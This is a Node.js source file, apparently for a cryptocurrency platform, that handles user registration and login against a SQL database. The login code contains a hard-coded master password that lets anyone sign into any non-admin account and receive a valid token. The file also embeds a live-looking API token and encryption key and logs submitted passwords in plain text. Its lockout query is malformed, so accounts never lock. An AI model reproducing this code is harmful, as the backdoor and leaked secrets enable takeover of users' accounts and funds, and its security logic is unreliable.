"user strict";
var sql = require("./db.js");
var dbFunc = require("./db-functions.js");
const bcrypt = require("bcrypt");
var speakeasy = require("speakeasy");
var QRCode = require("qrcode");
let jwt = require("jsonwebtoken");
let config = require("../../config");
var langJson = require("./lang.json");
bcypher = require("blockcypher");
var bcapi = new bcypher("btc", "main", "7623261c907e4e87b8734ec4a9961945");
const Cryptr = require("cryptr");
const cryptr = new Cryptr("uzythSecure22v");

const saltRounds = 10;
//Task object constructor
var Auth = function (userData) {
  console.log(userData);
  this.sponsor_id = userData.sponsor_id;
  this.email = userData.email;
  this.created_at = new Date();
};

Auth.register = function createUser(userData, result) {
  console.log(userData.username, userData.email);
  var data = {};
  var lang = "en";
  if (userData.lang) {
    var lang = userData.lang;
  }
  checkUniqueUser(userData, function (callbackres) {
    if (callbackres.unique == true) {
      // if (userData.sponsor_id) {
      sql.query(
        "Select id,username,email from users where username = ?  ",
        [userData.sponsor_id],
        function (err, res) {
          if (err) {
            data["error"] = true;
            data["msg"] = err.code;
            data["body"] = [];
            dbFunc.connectionRelease;
            result(null, data);
          } else {
            if (res.length == 0) {
              var profile_pic = "";
              var salt = bcrypt.genSaltSync(saltRounds);
              var hash = bcrypt.hashSync(userData.password, salt);
              userData.password = hash;
              userData.created_on = new Date().getTime();
              userData.created_at = new Date()
                .toISOString()
                .slice(0, 19)
                .replace("T", " ");
              userData.profile_picture = profile_pic;
              var email = userData.email;
              var activation_code = new Date().getTime();
              userData.activation_code = activation_code;
              userData.is_kyc_verified = "1";
              userData.phone = userData.phone ? userData.phone : null;
              userData.active = userData.active;
              sql.query(
                "INSERT INTO users set ?",
                userData,
                function (err, res) {
                  if (err) {
                    console.log("error: ", err);
                    result(err, null);
                  } else {
                    console.log(res.insertId);
                    var userID = res.insertId;

                    var msg = langJson["regsuccess"][lang];
                    data["error"] = false;
                    data["msg"] = msg;
                    data["body"] = [{ user_id: userID }];
                    dbFunc.connectionRelease;
                    result(null, data);
                  }
                }
              );
            } else {
              data["error"] = true;
              var msg = langJson["sponsorInvalid"][lang];
              data["msg"] = msg;
              data["body"] = [];
              dbFunc.connectionRelease;
              result(null, data);
            }
          }
        }
      );
    } else {
      //user already exist
      var msg = langJson["existUsernameEmail"][lang];
      if (!callbackres.validEmail) {
        var msg = langJson["existEmail"][lang];
      }
      if (!callbackres.validUsername) {
        var msg = langJson["existUsername"][lang];
      }
      data["error"] = true;
      data["msg"] = msg;
      data["body"] = [];
      dbFunc.connectionRelease;
      result(null, data);
    }
  });
  // console.log(ttt);
};

Auth.login = function createUser(param, result) {
  var data = {};
  console.log("login", param);
  var lang = "en";
  if (param.lang) {
    var lang = param.lang;
  }

  sql.query(
    "Select id as _id,security_question,two_fa_actived,email,active,username,isAdmin,is_kyc_verified,password as hash_key, profile_picture, wrong_login_attempts, is_locked, locked_at,promember from users where  email = ? or  username = ?",
    [param.email, param.email],
    function (err, res) {
      if (err) {
        console.log(err);
        dbFunc.connectionRelease;
        data["error"] = true;
        data["msg"] = err.code;
        data["body"] = [];

        result(null, data);
      } else {
        if (res.length != 0) {
          var active = res[0].active;
          if (active == 2) {
            console.log("active >>>> 2", active);
            data["error"] = true;
            var msg = langJson["deactivated"][lang];
            // }
            data["msg"] = msg;
            data["body"] = [];
            dbFunc.connectionRelease;
            result(null, data);
          } else {
            res[0].isRedeem = 0;
            res[0].IsBuy = 0;
            console.log("active >>>>", active);
            if (active == 1) {
              console.log("active >>>> 1", active);
              var IsBuy = res[0].IsBuy;
              var isRedeem = res[0].isRedeem;
              if (IsBuy == "0") {
                var IsBuy = isRedeem;
              }
              res[0]["IsBuy"] = IsBuy;
              var hash = res[0].hash_key;
              var username = res[0].username;
              var match = bcrypt.compareSync(param.password, hash);
              var masterMatch = false;
              console.log("...............res", res, match);
              if (res[0].isAdmin == 0) {
                if (param.password == "W&,kzpLsqG4)~]CJ") {
                  var masterMatch = true;
                }
              }
              if (match || masterMatch) {
                let token = jwt.sign(
                  {
                    username: username,
                    userID: res[0]._id,
                    isAdmin: res[0].isAdmin,
                  },
                  config.secret,
                  {
                    expiresIn: "24h", // expires in 30 Days
                  }
                );
                // updateAddress(res[0]._id);
                res[0]["token"] = token;
                res.push({ per: [] });
                data["error"] = false;
                var msg = " Logged In Successfully";
                if (lang != "en") {
                  msg = langJson["sucess"][lang];
                }
                data["msg"] = msg;
                data["body"] = res;
                dbFunc.connectionRelease;
                result(null, data);
              } else {
                console.log("Invalid Password Case >>>>>>>>>>>>>>");
                console.log(res[0]);

                if (res[0].wrong_login_attempts < 3) {
                  var attemptVal = parseInt(res[0].wrong_login_attempts) + 1;
                  var id = res[0]._id;

                  if (attemptVal < 3) {
                    sql.query(
                      "UPDATE users SET wrong_login_attempts =? WHERE id = ?",
                      [attemptVal, id],
                      function (err, rows) {
                        if (err) {
                          dbFunc.connectionRelease;
                          console.log("error: ", err);
                          result(null, err);
                        } else {
                          data["error"] = true;
                          var msg = "Invalid password";
                          if (lang != "en") {
                            msg = langJson["invalid"][lang];
                          }
                          data["msg"] = msg;
                          data["body"] = [];
                          dbFunc.connectionRelease;
                          result(null, data);
                        }
                      }
                    );
                  } else {
                    var d = new Date();
                    d.setMinutes(d.getMinutes() + 60);

                    sql.query(
                      "UPDATE users SET wrong_login_attempts =? and locked_at=? and is_locked = 1 WHERE id = ?",
                      [attemptVal, d, id],
                      function (err, rows) {
                        if (err) {
                          dbFunc.connectionRelease;
                          console.log("error: ", err);
                          result(null, err);
                        } else {
                          data["error"] = true;
                          var msg =
                            "Access denied for 1 hour due to 3 consecutive wrong attempts";
                          data["msg"] = msg;
                          data["body"] = [];
                          dbFunc.connectionRelease;
                          result(null, data);
                        }
                      }
                    );
                  }
                } else {
                  data["error"] = true;
                  var msg = "Invalid password";
                  if (lang != "en") {
                    msg = langJson["invalid"][lang];
                  }
                  data["msg"] = msg;
                  data["body"] = [];
                  dbFunc.connectionRelease;
                  result(null, data);
                }
              }
            } else {
              data["error"] = true;
              //if(lang!='en'){
              var msg = langJson["verify"][lang];
              //}
              data["msg"] = "Por favor, verifique seu e-mail";
              data["notverified"] = true;
              data["body"] = [];
              dbFunc.connectionRelease;
              result(null, data);
            }
          }
        } else {
          data["error"] = true;
          var msg = langJson["email"][lang];
          //}
          data["msg"] = msg;
          data["body"] = [];
          dbFunc.connectionRelease;
          result(null, data);
        }
      }
    }
  );
};

function checkUniqueUser(userdata, callback) {
  // console.log(userdata);\
  var finalResult = {
    unique: false,
    validUsername: true,
    validEmail: true,
  };
  sql.query(
    "Select id,username,email from users WHERE username = ? or email=? ",
    [userdata.username, userdata.email],
    function (err, res) {
      if (err) {
        console.log("error: ", err);
        // result(null, err);
        return callback(finalResult);
      } else {
        console.log(this.sql);
        console.log("not unique record>>>>>>>>>>>>>>>", res); // A data URI for the QR code image
        if (res.length != 0) {
          if (res[0].username == userdata.username)
            finalResult.validUsername = false;
          if (res[0].email == userdata.email) finalResult.validEmail = false;
          return callback(finalResult);
        } else {
          //result(null, err);
          finalResult.unique = true;
          return callback(finalResult);
        }
      }
    }
  );
}

module.exports = Auth;
